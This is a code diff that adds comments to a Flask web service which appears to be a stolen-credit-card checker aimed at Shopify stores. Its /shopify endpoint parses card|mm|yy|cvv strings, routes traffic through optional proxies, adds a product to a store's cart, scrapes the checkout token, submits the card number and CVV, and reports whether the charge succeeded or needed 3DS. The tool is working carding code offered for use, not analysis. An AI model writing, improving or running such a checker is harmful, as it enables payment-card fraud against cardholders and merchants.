@@ -11,11 +11,12 @@ app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
 
 # =============== CONFIG ===============
-REQUEST_TIMEOUT = 20
+REQUEST_TIMEOUT = 20          # seconds per HTTP request
 MAX_RETRIES = 2
 
 # =============== HELPERS ===============
 def extract_cc(text):
+    """Extract card, month, year, cvv from format: card|mm|yy|cvv"""
     pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
     match = re.search(pattern, text)
     if match:
@@ -26,6 +27,7 @@ def extract_cc(text):
     return None, None, None, None
 
 def get_proxy_dict(proxy_str):
+    """Convert proxy string to requests proxy dict."""
     if not proxy_str:
         return None
     parts = proxy_str.split(':')
@@ -44,6 +46,7 @@ def get_proxy_dict(proxy_str):
     return None
 
 def get_random_product_id(site, session, proxy_dict):
+    """Fetch a product ID from the store's product list."""
     try:
         url = f"{site}/products.json?limit=1"
         resp = session.get(url, proxies=proxy_dict, timeout=REQUEST_TIMEOUT)
@@ -56,6 +59,7 @@ def get_random_product_id(site, session, proxy_dict):
     return None
 
 def add_to_cart(site, session, product_id, quantity=1, proxy_dict=None):
+    """Add a product to the cart."""
     try:
         url = f"{site}/cart/add.js"
         payload = {'id': product_id, 'quantity': quantity}
@@ -69,6 +73,7 @@ def add_to_cart(site, session, product_id, quantity=1, proxy_dict=None):
         return False
 
 def get_checkout_url(site, session, proxy_dict):
+    """Get the checkout URL after adding to cart."""
     try:
         url = f"{site}/cart.js"
         resp = session.get(url, proxies=proxy_dict, timeout=REQUEST_TIMEOUT)
@@ -81,6 +86,7 @@ def get_checkout_url(site, session, proxy_dict):
         return f"{site}/checkout"
 
 def get_authenticity_token(session, checkout_url, proxy_dict):
+    """Extract authenticity token from checkout page."""
     try:
         resp = session.get(checkout_url, proxies=proxy_dict, timeout=REQUEST_TIMEOUT)
         if resp.status_code == 200:
@@ -96,11 +102,13 @@ def get_authenticity_token(session, checkout_url, proxy_dict):
     return None
 
 def submit_payment(site, session, card, month, year, cvv, authenticity_token, proxy_dict):
+    """Submit payment details to checkout."""
     if authenticity_token and len(authenticity_token) > 10:
         checkout_url = f"{site}/checkout/{authenticity_token}/payment"
     else:
         checkout_url = f"{site}/checkout/payment"
 
+    # Basic payment data – some fields are required
     payload = {
         'authenticity_token': authenticity_token or '',
         'checkout[credit_card][number]': card,
@@ -130,6 +138,7 @@ def submit_payment(site, session, card, month, year, cvv, authenticity_token, pr
         resp = session.post(checkout_url, data=payload, headers=headers, proxies=proxy_dict, timeout=REQUEST_TIMEOUT)
         if resp.status_code == 200:
             html = resp.text
+            # Check for success indicators
             if 'order placed' in html.lower() or 'thank you' in html.lower():
                 price_match = re.search(r'total_price["\']?\s*[:=]\s*["\']?([\d.]+)', html)
                 price = float(price_match.group(1)) if price_match else 0.0
@@ -147,11 +156,17 @@ def submit_payment(site, session, card, month, year, cvv, authenticity_token, pr
         return {"status": "error", "message": str(e), "price": 0.0}
 
 def checkout_shopify(site, card, month, year, cvv, proxy=None):
+    """
+    Complete Shopify checkout flow.
+    Returns dict with Response, Price, Gateway.
+    """
     session = requests.Session()
     proxy_dict = get_proxy_dict(proxy) if proxy else None
 
+    # 1. Get product ID
     product_id = get_random_product_id(site, session, proxy_dict)
     if not product_id:
+        # Fallback: try to get from cart (if already in cart) – but we don't have, so try a default product ID
         product_id = 1
         try:
             resp = session.get(f"{site}/products.json?limit=1", proxies=proxy_dict, timeout=REQUEST_TIMEOUT)
@@ -165,14 +180,18 @@ def checkout_shopify(site, card, month, year, cvv, proxy=None):
     if not product_id:
         return {"Response": "Could not find any product", "Price": 0, "Gateway": "Shopify Payments"}
 
+    # 2. Add to cart
     if not add_to_cart(site, session, product_id, 1, proxy_dict):
         return {"Response": "Failed to add product to cart", "Price": 0, "Gateway": "Shopify Payments"}
 
+    # 3. Get checkout URL and authenticity token
     checkout_url = get_checkout_url(site, session, proxy_dict)
     token = get_authenticity_token(session, checkout_url, proxy_dict)
 
+    # 4. Submit payment
     result = submit_payment(site, session, card, month, year, cvv, token, proxy_dict)
 
+    # Map result to expected format
     if result['status'] == 'charged':
         return {"Response": result['message'], "Price": result['price'], "Gateway": "Shopify Payments"}
     elif result['status'] == '3ds':
@@ -182,6 +201,7 @@ def checkout_shopify(site, card, month, year, cvv, proxy=None):
     else:
         return {"Response": f"ERROR: {result['message']}", "Price": 0, "Gateway": "Shopify Payments"}
 
+# =============== API ENDPOINT ===============
 @app.route('/shopify', methods=['GET'])
 def shopify_check():
     site = request.args.get('site')
@@ -208,6 +228,7 @@ def shopify_check():
 
     try:
         result = checkout_shopify(site, card, month, year, cvv, proxy)
+        # Ensure required keys
         result.setdefault('Response', 'Unknown')
         result.setdefault('Price', 0.0)
         result.setdefault('Gateway', 'Shopify Payments')
@@ -220,10 +241,12 @@ def shopify_check():
             "Gateway": "Shopify Payments"
         }), 500
 
+# =============== HEALTH CHECK ===============
 @app.route('/ping', methods=['GET'])
 def ping():
     return jsonify({"status": "alive", "time": datetime.now().isoformat()})
 
+# =============== RUN ===============
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
